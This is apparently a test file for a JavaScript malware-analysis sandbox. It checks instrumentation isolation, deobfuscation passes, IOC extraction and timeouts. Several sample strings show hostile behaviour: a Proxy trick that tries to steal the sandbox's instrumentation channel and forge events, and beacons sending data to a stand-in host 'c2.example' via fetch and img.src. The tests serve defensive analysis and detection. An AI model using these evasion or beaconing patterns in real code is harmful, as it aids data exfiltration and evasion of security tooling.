import test from 'node:test'
import assert from 'node:assert/strict'
import { TracelessSandbox } from '../tools/sandbox/sandbox.js'
import { analyzeSample } from '../tools/analysis/orchestrator.js'
import { restore } from '../tools/restore/index.js'
import { createHookBus } from '../tools/hook/hookbus.js'
import { createTraceRecorder } from '../tools/instrumentation/trace.js'
import { extractIOCs } from '../tools/analysis/ioc.js'

/**
 * Acceptance P0 contracts lifted from `docs/ACCEPTANCE.md` /
 * `tests/fixtures/acceptance/`.
 *
 * Wave 1 P0s and Wave 2 H9 hook-bus items are hard asserts.
 */

test('P0-1 Object.assign Proxy set trap cannot steal the instrumentation channel', async () => {
  const sb = await TracelessSandbox.create({ logLevel: 'silent', limits: { timeoutMs: 15_000 } })
  try {
    const run = await sb.run(`
      const out = {};
      let stolen = null;
      Object.assign(new Proxy({}, {
        set(t, k, v) { if (typeof k === 'symbol') stolen = k; return true }
      }), document);
      out.stolenSymbolType = stolen === null ? 'none' : 'symbol';
      out.stolenKey = stolen === null ? null : Symbol.keyFor(stolen);
      out.channelType = stolen === null ? 'n/a' : typeof document[stolen];
      JSON.stringify(out)
    `, { level: 'statement' })
    assert.equal(run.ok, true, JSON.stringify(run.error))
    const value = JSON.parse(run.result.preview)
    assert.equal(value.stolenSymbolType, 'none')
    assert.equal(value.stolenKey, null)
    assert.equal(value.channelType, 'n/a')
  } finally {
    sb.dispose()
  }
})

test('P0-1 stolen channel cannot inject forged code:step events', async () => {
  const sb = await TracelessSandbox.create({ logLevel: 'silent', limits: { timeoutMs: 15_000 } })
  try {
    const run = await sb.run(`
      let stolen = null;
      Object.assign(new Proxy({}, {
        set(t, k, v) { if (typeof k === 'symbol') stolen = k; return true }
      }), document);
      let callResult = 'no-channel';
      if (stolen !== null) {
        try { callResult = String(document[stolen](0, 1, 'forged-value')); }
        catch (e) { callResult = 'THREW:' + e.name }
      }
      JSON.stringify({ callResult, stolen: stolen !== null })
    `, { level: 'statement' })
    assert.equal(run.ok, true, JSON.stringify(run.error))
    const value = JSON.parse(run.result.preview)
    assert.equal(value.stolen, false)
    const forged = (run.events ?? []).filter(
      (event) => event.kind === 'code' && event.phase === 'step'
        && JSON.stringify(event).includes('forged-value'),
    )
    assert.equal(forged.length, 0)
  } finally {
    sb.dispose()
  }
})

test('P0-2 AbortController.abort with forged stack shape does not hit stack limit', async () => {
  const sb = await TracelessSandbox.create({ logLevel: 'silent', limits: { timeoutMs: 15_000 } })
  try {
    const run = await sb.run(`
      const c = new AbortController();
      c.abort({ name: 'RangeError', message: 'Maximum call stack size exceeded' });
      try { c.signal.throwIfAborted(); } catch (e) { /* swallow */ }
      42
    `)
    assert.equal(run.ok, true, JSON.stringify(run.error))
    assert.equal(run.result.value, 42)
    assert.deepEqual(run.limitsHit, [])
    assert.equal(run.stackExhaustion, false)
    assert.equal(run.disposal.ok, true, JSON.stringify(run.disposal))
    assert.equal(Boolean(run.disposal.leaked), false)
    assert.equal(Boolean(run.disposal.skipped), false)
  } finally {
    sb.dispose()
  }
})

test('P0-3 element listener dispose does not report a handle leak', async () => {
  const sb = await TracelessSandbox.create({ logLevel: 'silent', limits: { timeoutMs: 15_000 } })
  try {
    const run = await sb.run(`
      const img = new Image();
      img.addEventListener('load', function () {});
      img.addEventListener('error', function () {});
      'listener-attached'
    `)
    assert.equal(run.ok, true, JSON.stringify(run.error))
    assert.equal(run.disposal.ok, true, JSON.stringify(run.disposal))
    assert.equal(Boolean(run.disposal.leaked), false)
  } finally {
    sb.dispose()
  }
})

test('P0-4 throw a, b yields the same caught value with instrumentation on and off', async () => {
  const source = `
    let caught;
    try { throw 1, 2 } catch (e) { caught = e }
    caught
  `
  const sb = await TracelessSandbox.create({ logLevel: 'silent', limits: { timeoutMs: 15_000 } })
  try {
    const off = await sb.run(source, { level: 'off' })
    const on = await sb.run(source, { level: 'statement' })
    assert.equal(off.ok, true, JSON.stringify(off.error))
    assert.equal(on.ok, true, JSON.stringify(on.error))
    assert.equal(off.result.value, on.result.value)
    assert.equal(off.result.value, 2)
  } finally {
    sb.dispose()
  }
})

test('P0-6 keepTrace does not change the verdict score for the same sample', async () => {
  const source = `
    var s = 0;
    for (var i = 0; i < 6000; i++) { s += i }
    fetch('https://c2.example/beacon?d=' + s);
    s;
  `
  const kept = await analyzeSample(source, { name: 'big.js', logLevel: 'silent', keepTrace: true })
  const dropped = await analyzeSample(source, { name: 'big.js', logLevel: 'silent', keepTrace: false })
  const reportKept = kept.report ?? kept
  const reportDropped = dropped.report ?? dropped
  assert.equal(reportKept.verdict.score, reportDropped.verdict.score)
  const codes = (report) => (report.verdict?.reasons ?? []).map((reason) => reason.code ?? reason.id ?? reason)
  assert.equal(
    codes(reportKept).includes('DYNAMIC_NETWORK'),
    codes(reportDropped).includes('DYNAMIC_NETWORK'),
  )
  assert.equal(codes(reportKept).includes('DYNAMIC_NETWORK'), true)
  assert.deepEqual(reportKept.provenance, reportDropped.provenance)
})

test('P0-7 string-array keeps a dynamically referenced array on window', () => {
  const input = "var _0xa = ['alpha','bravo','charlie','delta']; window.log(window._0xa[0]);"
  const result = restore(input, { only: ['string-array'], maxRounds: 1 })
  assert.match(result.code, /_0xa\s*=\s*\[/)
  assert.match(result.code, /window\._0xa/)
})

test('P0-8 dead-code keeps the else arm of if (0n)', () => {
  const result = restore('if (0n) { live() } else { dead() }', {
    only: ['dead-code'],
    maxRounds: 1,
  })
  assert.match(result.code, /dead\s*\(/)
  assert.doesNotMatch(result.code, /^\s*\{\s*live\s*\(\s*\)\s*;?\s*\}\s*$/m)
})


test('P0-5 maxInsertions sweep never blames a SyntaxError on the sample', async () => {
  const sb = await TracelessSandbox.create({ logLevel: 'silent', limits: { timeoutMs: 15_000 } })
  try {
    for (const n of [1, 2, 3, 4, 5, 6, 8, 10, 12]) {
      const run = await sb.run(`function f(){ throw new Error('x') } f()`, {
        level: 'statement',
        instrumentation: { code: { maxInsertions: n } },
      })
      assert.notEqual(run.error?.name, 'SyntaxError', `maxInsertions=${n}`)
    }
  } finally {
    sb.dispose()
  }
})

test('P0-9 BufferSource windows, NUL code units, and RNG byteLength are correct', async () => {
  const { createHarness } = await import('./helpers/harness.js')
  const { ENV_MODULE_IDS } = await import('../tools/sandbox/env/index.js')
  const h = await createHarness({ modules: ENV_MODULE_IDS, limits: { timeoutMs: 10_000 }, seed: 1 })
  try {
    const sync = h.run(`
      const out = {};
      const dv = new DataView(new ArrayBuffer(8));
      crypto.getRandomValues(dv);
      out.dataViewAllZero = Array.from(new Uint8Array(dv.buffer)).every(function (b) { return b === 0 });
      try { crypto.getRandomValues(new Uint32Array(16385)); out.u32Quota = 'no-error' }
      catch (e) { out.u32Quota = String(e.name) }
      out.atobLen = atob('AA==').length;
      out.btoa = btoa('a\u0000b');
      out.enc = Array.from(new TextEncoder().encode('a\u0000b'));
      out.dec = new TextDecoder().decode(new Uint8Array([97, 0, 98]));
      const ei = new TextEncoder().encodeInto('\u20ac', new Uint8Array(2));
      out.encodeInto = { read: ei.read, written: ei.written };
      JSON.stringify(out)
    `)
    assert.equal(sync.ok, true, JSON.stringify(sync.error))
    const value = JSON.parse(sync.value)
    assert.equal(value.dataViewAllZero, false)
    assert.equal(value.u32Quota, 'QuotaExceededError')
    assert.equal(value.atobLen, 1)
    assert.equal(value.btoa, 'YQBi')
    assert.deepEqual(value.enc, [97, 0, 98])
    assert.equal(value.dec, 'a\u0000b')
    assert.deepEqual(value.encodeInto, { read: 0, written: 0 })

    h.run(`
      globalThis.__digest = null;
      const buf = new Uint8Array(16);
      for (var i = 0; i < 16; i++) buf[i] = i;
      crypto.subtle.digest('SHA-256', new Uint8Array(buf.buffer, 4, 4)).then(function (d) {
        globalThis.__digest = Array.from(new Uint8Array(d)).map(function (x) {
          return x.toString(16).padStart(2, '0')
        }).join('').slice(0, 16);
      });
      'digest-queued'
    `)
    h.jobs(200)
    const digest = h.run('globalThis.__digest')
    assert.equal(digest.ok, true, JSON.stringify(digest.error))
    assert.equal(digest.value, 'c6d44cf418f610e3')
  } finally {
    h.dispose()
  }
})

test('P0-10 img.src beacon emits net and ioc events', async () => {
  const sb = await TracelessSandbox.create({ logLevel: 'silent', limits: { timeoutMs: 15_000 } })
  try {
    const run = await sb.run(`new Image().src = 'https://c2.example/beacon?d=1'; 1`)
    assert.equal(run.ok, true, JSON.stringify(run.error))
    const net = (run.events ?? []).filter((event) => event.kind === 'net')
    const ioc = (run.events ?? []).filter((event) => event.kind === 'ioc')
    assert.ok(net.length >= 1, 'expected net event')
    assert.ok(ioc.length >= 1, 'expected ioc event')
  } finally {
    sb.dispose()
  }
})

test('P0-11 hostile email-shaped input finishes in bounded time', () => {
  const started = Date.now()
  const iocs = extractIOCs('a'.repeat(200_000))
  const elapsed = Date.now() - started
  assert.ok(elapsed < 2_000, `extractIOCs took ${elapsed}ms`)
  assert.ok(Array.isArray(iocs.emails))
})

test('P0-12 host wall timeout marks the run provisional', async () => {
  const sb = await TracelessSandbox.create({ logLevel: 'silent', limits: { timeoutMs: 5 } })
  try {
    const run = await sb.run('var s = 0; for (var i = 0; i < 5e6; i++) s += i; s')
    assert.equal(run.provisional, true)
    assert.ok((run.limitsHit ?? []).includes('timeout'))
  } finally {
    sb.dispose()
  }
})

test('H21 instrumentation plan retention is gated by maxInsertions', async () => {
  const source = 'var x = 0;\n' + 'x++;\n'.repeat(20_000)
  const sb = await TracelessSandbox.create({ logLevel: 'silent', limits: { timeoutMs: 30_000 } })
  try {
    const run = await sb.run(source, {
      level: 'statement',
      instrumentation: { code: { maxInsertions: 1_000 } },
    })
    const instrumented = (run.events ?? []).find((event) => event.event === 'instrumented')
    assert.ok(instrumented, 'expected instrumented event')
    assert.ok(instrumented.planSize <= 1_000, `planSize=${instrumented.planSize}`)
    assert.ok(instrumented.insertions <= 1_000, `insertions=${instrumented.insertions}`)
  } finally {
    sb.dispose()
  }
})

test('H9 pipeline on a wildcard phase applies a transform exactly once', () => {
  // Defect shape: pipeline('code:*', …) matches the handler twice (exact + wildcard).
  const bus = createHookBus()
  let calls = 0
  bus.on('code:*', (source) => {
    calls += 1
    return `${source}/*x*/`
  }, { id: 'wild' })
  const result = bus.pipeline('code:*', 'a')
  assert.equal(calls, 1)
  assert.equal(result.steps.length, 1)
  assert.equal(result.value, 'a/*x*/')
})

test('H9 a throwing logger does not escape dispatch', () => {
  const bus = createHookBus({
    logger: {
      warn() {
        throw new Error('log-boom')
      },
    },
  })
  bus.on('api:before', () => {
    throw new Error('hook-boom')
  }, { id: 'broken' })
  assert.doesNotThrow(() => bus.dispatch('api:before', { api: 'x' }))
})

test('H9 chained trace.child kinds remain emit-safe', () => {
  const root = createTraceRecorder()
  const child = root.child('hook').child('net')
  assert.doesNotThrow(() => child.emit('probe', { ok: true }))
})
